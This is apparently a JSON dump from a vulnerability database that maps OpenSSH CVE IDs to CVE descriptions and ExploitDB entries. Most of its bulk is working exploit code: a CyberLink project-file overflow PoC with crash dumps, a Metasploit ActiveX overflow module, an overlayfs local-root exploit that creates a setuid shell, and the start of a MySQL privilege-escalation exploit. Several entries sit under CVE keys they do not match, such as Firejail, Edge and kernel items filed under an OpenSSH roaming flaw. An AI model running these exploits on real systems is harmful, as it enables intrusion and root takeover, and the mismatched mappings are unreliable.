(\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\tfill = (\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3e\\x3c\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x20\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\"\r\n\t\"\\x66\\x3d\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\\x64\\x3d\\x22\\x30\\x22\\x20\\x41\\x75\"\r\n\t\"\\x64\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x41\\x75\\x64\\x69\\x6f\\x47\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\"\r\n\t\"\\x22\\x2f\\x3e\\x3c\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x3c\"\r\n\t\"\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\ttry:\r\n\t\tf.write(header+hell+fill)\r\n\t\tprint \"[!] Generating\", wvefile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", wvefile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+wvefile+\"\\' \" + \"with CyberLink WaveEditor.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\nprint \"[*] CyberLink Multiple Products File Project Processing Stack Buffer Overflow POC.\"\r\nprint \"[*] by modpr0be <modpr0be[at]spentera[dot]com> | @modpr0be\"\r\nprint \"\\t1.CyberLink Power2Go <= 8.0\"\r\nprint \"\\t2.CyberLink WaveEditor <= 2.0\"\r\n\r\na = 0\r\nwhile a < 2:\r\n\ta = a + 1\r\n\top = input (\"[!] Choose the product: \")\r\n\tif op == 1:\r\n\t\tpower2go()\r\n\t\tsys.exit()\r\n\telif op == 2:\r\n\t\twaveeditor()\r\n\t\tsys.exit()\r\n\telse:\r\n\t\tprint \"[-] Oh plz.. pick the right one :)\\r\\n\"\r\n\r\n\r\n### DUMP OF POWER2GO\r\n#(d18.c60): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffde000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=07d4ffcc ebp=07d4fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:022> g\r\n#(d18.d40): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=ec8b55ff ebx=010358b0 ecx=78ad8951 edx=005b12fc esi=00430043 edi=0012d69c\r\n#eip=ec8b55ff esp=0012ca70 ebp=00000000 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\n#ec8b55ff ??              ???\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\Power2Go8\\Power2Go8.exe - \r\n#0:000> !exchain\r\n#0012ca9c: Power2Go8!CCLAuMixerAPI::operator=+156ba8 (00560dc8)\r\n#0012d104: Power2Go8!CCLAuMixerAPI::operator=+25e23 (00430043)\r\n#Invalid exception stack at 00420042\r\n#0:000> d 0012d104\r\n#0012d104  42 00 42 00 43 00 43 00-43 00 43 00 43 00 43 00  B.B.C.C.C.C.C.C.\r\n#0012d114  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d124  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d134  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d144  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d154  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d164  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d174  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n\r\n\r\n### DUMP OF WAVE EDITOR\r\n#(e44.734): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffd9000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=00e5ffcc ebp=00e5fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:016> g\r\n#(e44.e48): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=00410041 ebx=ffffffff ecx=0240868b edx=420b1802 esi=022ccbe8 edi=00d2f848\r\n#eip=024c47af esp=0012c424 ebp=0012c42c iopl=0         nv up ei pl nz na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveKernel.dll -\r\n#WaveKernel!ReleaseWaveKernelClient+0x12a8f:\r\n#024c47af 8b4208          mov     eax,dword ptr [edx+8] ds:0023:420b180a=????????\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:000> !exchain\r\n#0012c898: *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveEditor.exe -\r\n#WaveEditor!CCLAuMixerAPI::CCLAuMixerAPI+da61 (00410041)\r\n#Invalid exception stack at 00410041\r\n#0:000> d 0012c898\r\n#0012c898  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8e8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8f8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c908  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#",
                "description": "CyberLink (Multiple Products) - File Project Handling Stack Buffer Overflow (PoC)",
                "author": "modpr0be",
                "_id": 18220,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-09T00:00:00+00:00",
                "cve": [],
                "type": "dos",
                "port": 0
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ],
        "CVE-2014-1692": [
            {
                "source": "CVE",
                "_id": "2014-1692",
                "description": "The hash_buffer function in schnorr.c in OpenSSH through 6.4, when Makefile.inc is modified to enable the J-PAKE protocol, does not initialize certain data structures, which might allow remote attackers to cause a denial of service (memory corruption) or have unspecified other impact via vectors that trigger an error condition.",
                "osvdb": [
                    102611
                ],
                "bid": [
                    65230
                ],
                "cve": [
                    "CVE-2014-1692"
                ],
                "msb": []
            }
        ],
        "CVE-2010-5107": [
            {
                "source": "CVE",
                "_id": "2010-5107",
                "description": "The default configuration of OpenSSH through 6.1 enforces a fixed time limit between establishing a TCP connection and completing a login, which makes it easier for remote attackers to cause a denial of service (connection-slot exhaustion) by periodically making many new TCP connections.",
                "osvdb": [],
                "bid": [
                    58162
                ],
                "cve": [
                    "CVE-2010-5107"
                ],
                "msb": []
            },
            {
                "code": "##\r\n# $Id: ask_shortformat.rb 9262 2010-05-09 17:45:00Z jduck $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = NormalRanking\r\n\r\n\tinclude Msf::Exploit::Remote::HttpServer::HTML\r\n\tinclude Msf::Exploit::Remote::Seh\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'Ask.com Toolbar askBar.dll ActiveX Control Buffer Overflow',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a stack buffer overflow in Ask.com Toolbar 4.0.2.53.\r\n\t\t\t\tAn attacker may be able to excute arbitrary code by sending an overly\r\n\t\t\t\tlong string to the \"ShortFormat()\" method in askbar.dll.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         => [ 'MC' ],\r\n\t\t\t'Version'        => '$Revision: 9262 $',\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'CVE', '2007-5107' ],\r\n\t\t\t\t\t[ 'OSVDB', '37735' ],\r\n\t\t\t\t\t[ 'URL', 'http://wslabi.com/wabisabilabi/showBidInfo.do?code=ZD-00000148' ],\r\n\t\t\t\t],\r\n\t\t\t'DefaultOptions' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'EXITFUNC' => 'process',\r\n\t\t\t\t},\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'Space'         => 800,\r\n\t\t\t\t\t'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\r\n\t\t\t\t\t'StackAdjustment' => -3500,\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ 'Windows XP SP0/SP1 Pro English',     { 'Offset' => 2876, 'Ret' => 0x71aa32ad } ],\r\n\t\t\t\t\t[ 'Windows 2000 Pro English ALL',       { 'Offset' => 1716, 'Ret' => 0x75022ac4 } ],\r\n\t\t\t\t],\r\n\t\t\t'DisclosureDate' => 'Sep 24 2007',\r\n\t\t\t'DefaultTarget'  => 0))\r\n\tend\r\n\r\n\tdef autofilter\r\n\t\t\tfalse\r\n\tend\r\n\r\n\tdef check_dependencies\r\n\t\t\tuse_zlib\r\n\tend\r\n\r\n\tdef on_request_uri(cli, request)\r\n\t\t# Re-generate the payload\r\n\t\treturn if ((p = regenerate_payload(cli)) == nil)\r\n\r\n\t\t# Randomize some things\r\n\t\tvname\t= rand_text_alpha(rand(100) + 1)\r\n\t\tstrname\t= rand_text_alpha(rand(100) + 1)\r\n\r\n\t\t# Set the exploit buffer\r\n\t\tfiller = rand_text_alpha(target['Offset'])\r\n\t\tseh = generate_seh_payload(target.ret)\r\n\t\tsploit = filler + seh + rand_text_alpha(payload.encoded.length)\r\n\r\n\t\t# Build out the message\r\n\t\tcontent = %Q|<html>\r\n<object classid='clsid:5A074B2B-F830-49DE-A31B-5BB9D7F6B407' id='#{vname}'></object>\r\n<script language='javascript'>\r\n#{strname} = new String('#{sploit}');\r\n#{vname}.ShortFormat = #{strname}\r\n</script>\r\n</html>\r\n|\r\n\r\n\t\tprint_status(\"Sending exploit to #{cli.peerhost}:#{cli.peerport}...\")\r\n\r\n\t\t# Transmit the response to the client\r\n\t\tsend_response_html(cli, content)\r\n\r\n\t\t# Handle the payload\r\n\t\thandler(cli)\r\n\tend\r\n\r\nend",
                "description": "Ask.com Toolbar - 'askBar.dll' ActiveX Control Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 16557,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2010-05-09T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            }
        ],
        "CVE-2016-10708": [
            {
                "source": "CVE",
                "_id": "2016-10708",
                "description": "sshd in OpenSSH before 7.4 allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via an out-of-sequence NEWKEYS message, as demonstrated by Honggfuzz, related to kex.c and packet.c.",
                "osvdb": [],
                "bid": [
                    102780
                ],
                "cve": [
                    "CVE-2016-10708"
                ],
                "msb": []
            }
        ],
        "CVE-2010-4478": [
            {
                "source": "CVE",
                "_id": "2010-4478",
                "description": "OpenSSH 5.6 and earlier, when J-PAKE is enabled, does not properly validate the public parameters in the J-PAKE protocol, which allows remote attackers to bypass the need for knowledge of the shared secret, and successfully authenticate, by sending crafted values in each round of the protocol, a related issue to CVE-2010-4252.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2010-4478"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0777": [
            {
                "source": "CVE",
                "_id": "2016-10119",
                "description": "Firejail uses 0777 permissions when mounting /tmp, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10119"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-10120",
                "description": "Firejail uses 0777 permissions when mounting (1) /dev, (2) /dev/shm, (3) /var/tmp, or (4) /var/lock, which allows local users to gain privileges.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2016-10120"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-0777",
                "description": "The resend_bytes function in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2 allows remote servers to obtain sensitive information from process memory by requesting transmission of an entire buffer, as demonstrated by reading a private key.",
                "osvdb": [],
                "bid": [
                    80695
                ],
                "cve": [
                    "CVE-2016-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2016-8605",
                "description": "The mkdir procedure of GNU Guile temporarily changed the process' umask to zero. During that time window, in a multithreaded application, other threads could end up creating files with insecure permissions. For example, mkdir without the optional mode argument would create directories as 0777. This is fixed in Guile 2.0.13. Prior versions are affected.",
                "osvdb": [],
                "bid": [
                    93510
                ],
                "cve": [
                    "CVE-2016-8605"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0769",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102396
                ],
                "cve": [
                    "CVE-2018-0769"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0776",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102401
                ],
                "cve": [
                    "CVE-2018-0776"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0770",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102397
                ],
                "cve": [
                    "CVE-2018-0770"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0758",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102405
                ],
                "cve": [
                    "CVE-2018-0758"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0777",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102402
                ],
                "cve": [
                    "CVE-2018-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0781",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, and CVE-2018-0778.",
                "osvdb": [],
                "bid": [
                    102404
                ],
                "cve": [
                    "CVE-2018-0781"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0772",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102409
                ],
                "cve": [
                    "CVE-2018-0772"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0762",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102408
                ],
                "cve": [
                    "CVE-2018-0762"
                ],
                "msb": []
            },
            {
                "code": "/*\r\njust another overlayfs exploit, works on kernels before 2015-12-26\r\n\r\n# Exploit Title: overlayfs local root\r\n# Date: 2016-01-05\r\n# Exploit Author: rebel\r\n# Version: Ubuntu 14.04 LTS, 15.10 and more\r\n# Tested on: Ubuntu 14.04 LTS, 15.10\r\n# CVE : CVE-2015-8660\r\n\r\nblah@ubuntu:~$ id\r\nuid=1001(blah) gid=1001(blah) groups=1001(blah)\r\nblah@ubuntu:~$ uname -a && cat /etc/issue\r\nLinux ubuntu 3.19.0-42-generic #48~14.04.1-Ubuntu SMP Fri Dec 18 10:24:49 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\r\nUbuntu 14.04.3 LTS \\n \\l\r\nblah@ubuntu:~$ ./overlayfail\r\nroot@ubuntu:~# id\r\nuid=0(root) gid=1001(blah) groups=0(root),1001(blah)\r\n\r\n12/2015\r\nby rebel\r\n\r\n6354b4e23db225b565d79f226f2e49ec0fe1e19b\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <sched.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sched.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/mount.h>\r\n#include <sys/types.h>\r\n#include <signal.h>\r\n#include <fcntl.h>\r\n#include <string.h>\r\n#include <linux/sched.h>\r\n#include <sys/wait.h>\r\n\r\nstatic char child_stack[1024*1024];\r\n\r\nstatic int\r\nchild_exec(void *stuff)\r\n{\r\n    system(\"rm -rf /tmp/haxhax\");\r\n    mkdir(\"/tmp/haxhax\", 0777);\r\n    mkdir(\"/tmp/haxhax/w\", 0777);\r\n    mkdir(\"/tmp/haxhax/u\",0777);\r\n    mkdir(\"/tmp/haxhax/o\",0777);\r\n\r\n    if (mount(\"overlay\", \"/tmp/haxhax/o\", \"overlay\", MS_MGC_VAL, \"lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w\") != 0) {\r\n\tfprintf(stderr,\"mount failed..\\n\");\r\n    }\r\n\r\n    chmod(\"/tmp/haxhax/w/work\",0777);\r\n    chdir(\"/tmp/haxhax/o\");\r\n    chmod(\"bash\",04755);\r\n    chdir(\"/\");\r\n    umount(\"/tmp/haxhax/o\");\r\n    return 0;\r\n}\r\n\r\nint\r\nmain(int argc, char **argv)\r\n{\r\n    int status;\r\n    pid_t wrapper, init;\r\n    int clone_flags = CLONE_NEWNS | SIGCHLD;\r\n    struct stat s;\r\n\r\n    if((wrapper = fork()) == 0) {\r\n        if(unshare(CLONE_NEWUSER) != 0)\r\n            fprintf(stderr, \"failed to create new user namespace\\n\");\r\n\r\n        if((init = fork()) == 0) {\r\n            pid_t pid =\r\n                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);\r\n            if(pid < 0) {\r\n                fprintf(stderr, \"failed to create new mount namespace\\n\");\r\n                exit(-1);\r\n            }\r\n\r\n            waitpid(pid, &status, 0);\r\n\r\n        }\r\n\r\n        waitpid(init, &status, 0);\r\n        return 0;\r\n    }\r\n\r\n    usleep(300000);\r\n\r\n    wait(NULL);\r\n\r\n    stat(\"/tmp/haxhax/u/bash\",&s);\r\n\r\n    if(s.st_mode == 0x89ed)\r\n        execl(\"/tmp/haxhax/u/bash\",\"bash\",\"-p\",\"-c\",\"rm -rf /tmp/haxhax;python -c \\\"import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\\\"\",NULL);\r\n\r\n    fprintf(stderr,\"couldn't create suid :(\\n\");\r\n    return -1;\r\n}",
                "description": "Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)",
                "author": "rebel",
                "_id": 39166,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-01-05T00:00:00+00:00",
                "cve": [
                    "CVE-2015-8660"
                ],
                "type": "local",
                "port": 0
            },
            {
                "code": "/*\r\n\r\nSource: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html // http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c\r\n\r\nMySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\r\nmysql-privesc-race.c (ver. 1.0)\r\n\r\nCVE-2016-6663 / OCVE-2016-5616\r\n\r\nDiscovered/Coded by:\r\n\r\nDawid Golunski\r\ndawid[at]legalhackers.com\r\nhttps://legalhackers.com\r\n\r\nFollow https://twitter.com/dawid_golunski for updates on this advisory.\r\n\r\n\r\nCompile:\r\ngcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient\r\n\r\nNote:\r\n* On RedHat-based systems you might need to change /tmp to another public directory (e.g. /uploads)\r\n\r\n* For testing purposes only. Do no harm.  \r\n\r\nFull advisory URL:\r\nhttps://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html\r\n\r\nVideo PoC:\r\nhttps://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html\r\n\r\n*/\r\n\r\n\r\n#include <fcntl.h>\r\n#include <grp.h>\r\n#include <mysql.h>\r\n#include <pwd.h>\r\n#include <stdint.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <sys/inotify.h>\r\n#include <sys/stat.h>\r\n#include <sys/types.h>\r\n#include <sys/wait.h>\r\n#include <time.h>\r\n#include <unistd.h>\r\n\r\n\r\n#define EXP_PATH          \"/tmp/mysql_privesc_exploit\"\r\n#define EXP_DIRN          \"mysql_privesc_exploit\"\r\n#define MYSQL_TAB_FILE    EXP_PATH \"/exploit_table.MYD\"\r\n#define MYSQL_TEMP_FILE   EXP_PATH \"/exploit_table.TMD\"\r\n\r\n#define SUID_SHELL   \t  EXP_PATH \"/mysql_suid_shell.MYD\"\r\n\r\n#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary\r\n\r\nMYSQL *conn;\t\t  // DB handles\r\nMYSQL_RES *res;\r\nMYSQL_ROW row;\r\n\r\nunsigned long cnt;\r\n\r\n\r\nvoid intro() {\r\n\r\nprintf( \r\n        \"\\033[94m\\n\"\r\n        \"MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\\n\"\r\n        \"mysql-privesc-race.c (ver. 1.0)\\n\\n\"\r\n        \"CVE-2016-6663 / OCVE-2016-5616\\n\\n\"\r\n        \"For testing purposes only. Do no harm.\\n\\n\"\r\n\t\"Discovered/Coded by:\\n\\n\"\r\n\t\"Dawid Golunski \\n\"\r\n\t\"http://legalhackers.com\"\r\n        \"\\033[0m\\n\\n\");\r\n\r\n}\r\n\r\nvoid usage(char *argv0) {\r\n    intro();\r\n    printf(\"Usage:\\n\\n%s user pass db_host database\\n\\n\", argv0);\r\n}\r\n\r\nvoid mysql_cmd(char *sql_cmd, int silent) {\r\n    \r\n    if (!silent) {\r\n\t    printf(\"%s \\n\", sql_cmd);\r\n    }\r\n    if (mysql_query(conn, sql_cmd)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n    res = mysql_store_result(conn);\r\n    if (res>0) mysql_free_result(res);\r\n\r\n}\r\n\r\n\r\nint main(int argc,char **argv)\r\n{\r\n\r\n    int randomnum = 0;\r\n    int io_notified = 0;\r\n    int myd_handle;\r\n    int wpid;\r\n    int is_shell_suid=0;\r\n    pid_t pid;\r\n    int status;\r\n    struct stat st;\r\n    /* io notify */\r\n    int fd;\r\n    int ret;\r\n    char buf[4096] __attribute__((aligned(8)));\r\n    int num_read;\r\n    struct inotify_event *event;\r\n    /* credentials */\r\n    char *user     = argv[1];\r\n    char *password = argv[2];\r\n    char *db_host  = argv[3];\r\n    char *database = argv[4];\r\n\r\n\r\n    // Disable buffering of stdout\r\n    setvbuf(stdout, NULL, _IONBF, 0);\r\n\r\n    // Get the params\r\n    if (argc!=5) {\r\n\tusage(argv[0]);\r\n\texit(1);\r\n    } \r\n    intro();\r\n    // Show initial privileges\r\n    printf(\"\\n[+] 